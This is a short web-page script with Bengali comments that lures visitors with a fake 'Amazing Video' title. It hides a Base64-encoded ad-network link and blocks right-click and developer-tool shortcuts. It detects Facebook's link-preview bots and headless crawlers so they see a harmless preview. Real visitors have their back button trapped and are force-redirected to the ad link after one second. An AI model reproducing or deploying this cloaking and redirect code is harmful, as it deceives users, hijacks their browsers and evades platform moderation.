<script>
    // ১. লিংক এনক্রিপ্ট করা (Base64)
    // আপনার আসল লিংকটি এখানে এনকোড করা আছে, কেউ সোর্স কোড দেখলে সহজে বুঝবে না
    const encodedLink = "aHR0cHM6Ly9mYWxzaWZ5ZHdpZ2h0LmNvbS9zcGRzMzA5dW4/a2V5PWU5Njk0YjhlMDIxMTMyM2ZjY2E3MGU5Y2U2N2Q3ZDNh";
    const adsterraLink = atob(encodedLink); 
    
    const videoTitle = "Amazing Video - Must Watch!";
    document.getElementById('videoTitle').innerText = videoTitle;

    // ২. রাইট-ক্লিক এবং ডেভেলপার টুলস ব্লক করা
    document.addEventListener('contextmenu', e => e.preventDefault()); // রাইট ক্লিক বন্ধ
    document.onkeydown = function(e) {
        // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U ব্লক
        if(e.keyCode == 123 || 
           (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) || 
           (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) { 
            return false;
        }
    };

    // ৩. ফেসবুক বট ও অন্যান্য বট ডিটেকশন
    function isBot() {
        const ua = navigator.userAgent.toLowerCase();
        // ফেসবুক বট, হেডলেস ব্রাউজার বা ক্রলার ডিটেক্ট করবে
        return /facebookexternalhit|facebookbot|meta-externalagent|facebookcatalog|bot|crawler|spider|headless|phantom|selenium|puppeteer|playwright/i.test(ua);
    }

    // ৪. মূল লজিক
    if (isBot()) {
        // বট হলে রিডাইরেক্ট হবে না
        document.getElementById('loadingText').innerHTML = "<i>Preview mode - Redirect blocked.</i>";
        document.getElementById('loadingText').style.display = 'block';
    } else {
        // মানুষ হলে ব্যাক-বাটন ব্লক করা হবে
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1); // ইউজার ব্যাক চাপলে আবার সোজা সামনে চলে যাবে
        };

        // ১ সেকেন্ড (১০০০ মিলিসেকেন্ড) পর রিডাইরেক্ট
        setTimeout(function () {
            document.getElementById('loadingText').style.display = 'block';
            document.getElementById('loadingText').innerHTML = "<i>Redirecting to content...</i>";
            window.location.href = adsterraLink; 
        }, 1000); 
    }
</script>
